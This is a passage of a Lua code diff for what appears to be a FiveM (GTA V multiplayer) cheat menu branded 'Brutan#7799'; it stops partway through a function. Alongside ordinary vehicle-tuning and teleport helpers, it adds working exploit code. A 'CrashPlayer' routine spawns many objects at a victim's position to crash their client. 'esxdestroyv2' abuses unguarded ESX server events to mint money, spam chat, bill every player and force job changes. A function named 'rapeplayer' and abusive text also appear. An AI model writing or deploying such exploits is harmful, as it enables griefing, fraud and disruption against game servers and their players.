-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        1,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        2,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        3,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        4,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        5,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        6,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        7,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        8,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        9,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        10,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        11,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        12,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        13,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1,
-        false
-    )
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
     SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        15,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        16,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1,
-        false
-    )
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
@@ -6469,120 +3385,811 @@ function MaxOut(veh)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
     SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
     SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        25,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        27,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        28,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        30,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        33,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        34,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        35,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1,
-        false
-    )
-    SetVehicleMod(
-        GetVehiclePedIsIn(GetPlayerPed(-1), false),
-        38,
-        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1,
-        true
-    )
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
     SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
     SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
     SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
-    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
-    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
-    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
-    SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
-    SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
 end
 
-function DelVeh(veh)
-    SetEntityAsMissionEntity(Object, 1, 1)
-    DeleteEntity(Object)
-    SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
-    DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
+function MaxOutPerf(veh)
+    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
+    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
+    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
 end
 
-function Clean(veh)
-    SetVehicleDirtLevel(veh, 15.0)
-end
+function CrashPlayer(ped)
+    local playerPos = GetEntityCoords(ped, false)
+    local modelHashes = {
+        0x34315488,
+        0x6A27FEB1, 0xCB2ACC8,
+        0xC6899CDE, 0xD14B5BA3,
+        0xD9F4474C, 0x32A9996C,
+        0x69D4F974, 0xCAFC1EC3,
+        0x79B41171, 0x1075651,
+        0xC07792D4, 0x781E451D,
+        0x762657C6, 0xC2E75A21,
+        0xC3C00861, 0x81FB3FF0,
+        0x45EF7804, 0xE65EC0E4,
+        0xE764D794, 0xFBF7D21F,
+        0xE1AEB708, 0xA5E3D471,
+        0xD971BBAE, 0xCF7A9A9D,
+        0xC2CC99D8, 0x8FB233A4,
+        0x24E08E1F, 0x337B2B54,
+        0xB9402F87, 0x4F2526DA
+    }
 
-function Clean2(veh)
-    SetVehicleDirtLevel(veh, 1.0)
-end
-
-function RequestControl(entity)
-    local cI = 0
-    NetworkRequestControlOfEntity(entity)
-    while not NetworkHasControlOfEntity(entity) do
-        cI = cI + 100
-        Citizen.Wait(100)
-        if cI > 5000 then
-            av('Hung for 5 seconds, killing to prevent issues...', true)
-        end
+    for i = 1, #modelHashes do
+        obj = CreateObject(modelHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
     end
 end
 
-function getEntity(cD)
-    local m, entity = GetEntityPlayerIsFreeAimingAt(cD, Citizen.ReturnResultAnyway())
-    return entity
+capPa = 'd' .. 'o' .. 'k' .. 'i'
+cappA = 'd' .. 'o' .. 'k' .. 'i' .. capPa
+local bD = cappA
+
+function esxdestroyv2()
+                Citizen.CreateThread(
+                    function()
+                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
+                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
+                        TriggerServerEvent('esx_carthief:pay', 9999999999)
+                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
+                        TriggerServerEvent('esx_pizza:pay', 9999999999)
+                        TriggerServerEvent('esx_ranger:pay', 9999999999)
+                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
+                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
+                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
+                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
+                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
+                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
+                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
+                        for bD = 0, 9 do
+                            TriggerServerEvent(
+                                '_chat:messageEntered',
+                                '~g~Brutan#7799',
+                                {
+                                    141,
+                                    211,
+                                    255
+                                },
+                                '^' .. bD .. '~b~Brutan#7799'
+                            )
+                        end
+                        for i = 0, 256 do
+                            TriggerServerEvent(
+                                'esx:giveInventoryItem',
+                                GetPlayerServerId(i),
+                                'item_money',
+                                'money',
+                                1254756
+                            )
+                            TriggerServerEvent(
+                                'esx:giveInventoryItem',
+                                GetPlayerServerId(i),
+                                'item_money',
+                                'money',
+                                1254756
+                            )
+                            TriggerServerEvent(
+                                'esx_billing:sendBill',
+                                GetPlayerServerId(i),
+                                'Purposeless',
+                                '~g~Add me for more menus Brutan#7799',
+                                43161337
+                            )
+                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
+                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
+                        end
+                    end
+                )
+end
+
+function ch(C,x,y)
+    SetTextFont(0)
+    SetTextProportional(1)
+    SetTextScale(0.0,0.4)
+    SetTextDropshadow(1,0,0,0,255)
+    SetTextEdge(1,0,0,0,255)
+    SetTextDropShadow()
+    SetTextOutline()
+    SetTextEntry("STRING")
+    AddTextComponentString(C)
+    DrawText(x,y)
+end
+
+local function getPlayerIds()
+    local players = {}
+    for i = -1, 128 do
+        if NetworkIsPlayerActive(i) then
+            players[#players + 1] = i
+        end
+    end
+    return players
+end
+
+function DrawText3D(x, y, z, text, r, g, b)
+    SetDrawOrigin(x, y, z, 0)
+    SetTextFont(0)
+    SetTextProportional(0)
+    SetTextScale(0.0, 0.20)
+    SetTextColour(r, g, b, 255)
+    SetTextDropshadow(0, 0, 0, 0, 255)
+    SetTextEdge(2, 0, 0, 0, 150)
+    SetTextDropShadow()
+    SetTextOutline()
+    SetTextEntry("STRING")
+    SetTextCentre(1)
+    AddTextComponentString(text)
+    DrawText(0.0, 0.0)
+    ClearDrawOrigin()
+end
+
+local RCCar = {}
+
+-- BrutanPremium
+
+RCCar.Start = function()
+	if DoesEntityExist(RCCar.Entity) then return end
+
+	RCCar.Spawn()
+
+	RCCar.Tablet(true)
+
+	while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
+		Citizen.Wait(5)
+
+		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), true)
+
+		RCCar.DrawInstructions(distanceCheck)
+		RCCar.HandleKeys(distanceCheck)
+
+		if distanceCheck <= 10000000.0 then
+			if not NetworkHasControlOfEntity(RCCar.Driver) then
+				NetworkRequestControlOfEntity(RCCar.Driver)
+			elseif not NetworkHasControlOfEntity(RCCar.Entity) then
+				NetworkRequestControlOfEntity(RCCar.Entity)
+			end
+		else
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
+		end
+	end
+end
+
+RCCar.HandleKeys = function(distanceCheck)
+	if IsControlJustReleased(0, 47) then
+		if IsCamRendering(RCCar.Camera) then
+			RCCar.ToggleCamera(false)
+		else
+			RCCar.ToggleCamera(true)
+		end
+	end
+
+	if distanceCheck <= 10000000.0 then
+		if IsControlJustPressed(0, 73) then
+			RCCar.Attach("pick")
+		end
+	end
+
+	if distanceCheck < 10000000.0 then
+	    if IsControlJustReleased(0, 108) then
+		    local coos = GetEntityCoords(RCCar.Entity, true)
+            AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, true, false, 0)
+		end
+		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
+		end
+		
+		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
+		end
+
+		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
+		end
+
+		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
+		end
+
+		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
+		end
+
+		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
+		end
+
+		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
+		end
+
+		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
+		end
+
+		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
+		end
+
+		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
+		end
+	end
+end
+
+RCCar.DrawInstructions = function(distanceCheck)
+	local steeringButtons = {
+		{
+			["label"] = "Right",
+			["button"] = "~INPUT_CELLPHONE_RIGHT~"
+		},
+		{
+			["label"] = "Forward",
+			["button"] = "~INPUT_CELLPHONE_UP~"
+		},
+		{
+			["label"] = "Reverse",
+			["button"] = "~INPUT_CELLPHONE_DOWN~"
+		},
+		{
+			["label"] = "Left",
+			["button"] = "~INPUT_CELLPHONE_LEFT~"
+		}
+	}
+
+	local pickupButton = {
+		["label"] = "Delete",
+		["button"] = "~INPUT_VEH_DUCK~"
+	}
+	
+	local explodeButton = {
+		["label"] = "Explode",
+		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
+	}
+
+	local buttonsToDraw = {
+		{
+			["label"] = "Toggle Camera",
+			["button"] = "~INPUT_DETONATE~"
+		}
+	}
+
+	if distanceCheck <= 10000000.0 then
+		for buttonIndex = 1, #steeringButtons do
+			local steeringButton = steeringButtons[buttonIndex]
+
+			table.insert(buttonsToDraw, steeringButton)
+		end
+
+		if distanceCheck <= 1000000.0 then
+			table.insert(buttonsToDraw, explodeButton)
+		end
+		
+		if distanceCheck <= 1000000.0 then
+			table.insert(buttonsToDraw, pickupButton)
+		end
+	end
+
+    Citizen.CreateThread(function()
+        local instructionScaleform = RequestScaleformMovie("instructional_buttons")
+
+        while not HasScaleformMovieLoaded(instructionScaleform) do
+            Wait(0)
+        end
+
+        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
+        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
+        PushScaleformMovieFunctionParameterBool(0)
+        PopScaleformMovieFunctionVoid()
+
+        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
+            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
+            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)
+
+            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
+            PushScaleformMovieFunctionParameterString(buttonValues["label"])
+            PopScaleformMovieFunctionVoid()
+        end
+
+        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
+        PushScaleformMovieFunctionParameterInt(-1)
+        PopScaleformMovieFunctionVoid()
+        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
+    end)
+end
+
+-- 4x482
+
+RCCar.Spawn = function()
+	RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 })
+
+	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())
+
+	RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true)
+
+	while not DoesEntityExist(RCCar.Entity) do
+		Citizen.Wait(5)
+	end
+
+	RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)
+
+	SetEntityInvincible(RCCar.Driver, true)
+	SetEntityVisible(RCCar.Driver, false)
+	FreezeEntityPosition(RCCar.Driver, true)
+	SetPedAlertness(RCCar.Driver, 0.0)
+    SetVehicleNumberPlateText(RCCar.Entity, "Brutan#7799")
+	TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
+   
+
+	while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
+		Citizen.Wait(0)
+	end
+
+	RCCar.Attach("place")
+end
+
+RCCar.Attach = function(param)
+	if not DoesEntityExist(RCCar.Entity) then
+		return
+	end
+	
+	RCCar.LoadModels({ "pickup_object" })
+
+	if param == "place" then
+
+		PlaceObjectOnGroundProperly(RCCar.Entity)
+	elseif param == "pick" then
+		if DoesCamExist(RCCar.Camera) then
+			RCCar.ToggleCamera(false)
+		end
+
+		RCCar.Tablet(false)
+
+		DeleteVehicle(RCCar.Entity)
+		DeleteEntity(RCCar.Driver)
+
+		RCCar.UnloadModels()
+	end
+end
+
+RCCar.Tablet = function(boolean)
+	if boolean then
+
+
+
+	
+		Citizen.CreateThread(function()
+			while DoesEntityExist(RCCar.TabletEntity) do
+				Citizen.Wait(5)
+	
+
+			end
+
+			ClearPedTasks(PlayerPedId())
+		end)
+	else
+		DeleteEntity(RCCar.TabletEntity)
+	end
+end
+
+ConfigCamera = true
+
+RCCar.ToggleCamera = function(boolean)
+	if not ConfigCamera then return end
+
+	if boolean then
+		if not DoesEntityExist(RCCar.Entity) then return end 
+		if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end
+
+		RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
+
+		AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, 0.0, 0.4, true)
+
+		Citizen.CreateThread(function()
+			while DoesCamExist(RCCar.Camera) do
+				Citizen.Wait(5)
+
+				SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
+			end
+		end)
+
+		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)
+
+		RenderScriptCams(1, 1, easeTime, 1, 1)
+
+		Citizen.Wait(easeTime)
+
+	else
+		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)
+
+		RenderScriptCams(0, 1, easeTime, 1, 0)
+
+		Citizen.Wait(easeTime)
+
+		ClearTimecycleModifier()
+
+		DestroyCam(RCCar.Camera)
+	end
+end
+
+RCCar.LoadModels = function(models)
+	for modelIndex = 1, #models do
+		local model = models[modelIndex]
+
+		if not RCCar.CachedModels then
+			RCCar.CachedModels = {}
+		end
+
+		table.insert(RCCar.CachedModels, model)
+
+		if IsModelValid(model) then
+			while not HasModelLoaded(model) do
+				RequestModel(model)
+	
+				Citizen.Wait(10)
+			end
+		else
+			while not HasAnimDictLoaded(model) do
+				RequestAnimDict(model)
+	
+				Citizen.Wait(10)
+			end    
+		end
+	end
+end
+
+RCCar.UnloadModels = function()
+	for modelIndex = 1, #RCCar.CachedModels do
+		local model = RCCar.CachedModels[modelIndex]
+
+		if IsModelValid(model) then
+			SetModelAsNoLongerNeeded(model)
+		else
+			RemoveAnimDict(model)   
+		end
+	end
+end
+
+function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
+    AddTextEntry("FMMC_KEY_TIP9N", TextEntry .. ":")
+    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP9N", "", ExampleText, "", "", "", MaxStringLength)
+    blockinput = true
+
+    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
+        Citizen.Wait(0)
+    end
+
+    if UpdateOnscreenKeyboard() ~= 2 then
+        local result = GetOnscreenKeyboardResult()
+        Citizen.Wait(500)
+        blockinput = false
+        return result
+    else
+        Citizen.Wait(500)
+        blockinput = false
+        return nil
+    end
+end
+
+function DelVeh(veh)
+    SetEntityAsMissionEntity(veh, 1, 1)
+    DeleteEntity(veh)
+end
+
+function Clean(veh)
+	SetVehicleDirtLevel(veh, 15.0)
+end
+
+function Clean2(veh)
+	SetVehicleDirtLevel(veh, 1.0)
 end
 
 function GetInputMode()
-    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and 'MouseAndKeyboard' or 'GamePad'
+    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
 end
 
-
-
-function DrawSpecialText(cJ, cK)
-    SetTextEntry_2('STRING')
-    AddTextComponentString(cJ)
-    DrawSubtitleTimed(cK, 1)
+function TeleportToCoords()
+    local x = KeyboardInput("Enter X Pos", "", 100)
+    local y = KeyboardInput("Enter Y Pos", "", 100)
+    local z = KeyboardInput("Enter Z Pos", "", 100)
+    local entity
+    if x ~= "" and y ~= "" and z ~= "" then
+        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
+        else
+            entity = PlayerPedId()
+        end
+        if entity then
+            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
+        end
+    else
+        drawNotification("~r~Invalid Coordinates, are you fucking stupid?")
+    end
 end
-local cL = false
+
+function TeleportToWaypoint()
+    if DoesBlipExist(GetFirstBlipInfoId(8)) then
+        local blipIterator = GetBlipInfoIdIterator(8)
+        local blip = GetFirstBlipInfoId(8, blipIterator)
+        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
+        wp = true
+
+
+
+        local zHeigt = 0.0
+        height = 1000.0
+        while true do
+            Citizen.Wait(0)
+            if wp then
+                if
+                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
+                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
+                then
+                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
+                else
+                    entity = GetPlayerPed(-1)
+                end
+
+                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
+                FreezeEntityPosition(entity, true)
+                local Pos = GetEntityCoords(entity, true)
+
+                if zHeigt == 0.0 then
+                    height = height - 25.0
+                    SetEntityCoords(entity, Pos.x, Pos.y, height)
+                    bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
+                else
+                    SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
+                    FreezeEntityPosition(entity, false)
+                    wp = false
+                    height = 1000.0
+                    zHeigt = 0.0
+                    drawNotification("~g~Teleported to waypoint!")
+                    break
+                end
+            end
+        end
+    else
+        drawNotification("~r~You have no waypoint?!")
+    end
+end
+
+function rapeplayer()
+    Citizen.CreateThread(
+        function()
+            RequestModelSync('a_m_o_acult_01')
+            RequestAnimDict('rcmpaparazzo_2')
+            while not HasAnimDictLoaded('rcmpaparazzo_2') do
+                Citizen.Wait(0)
+            end
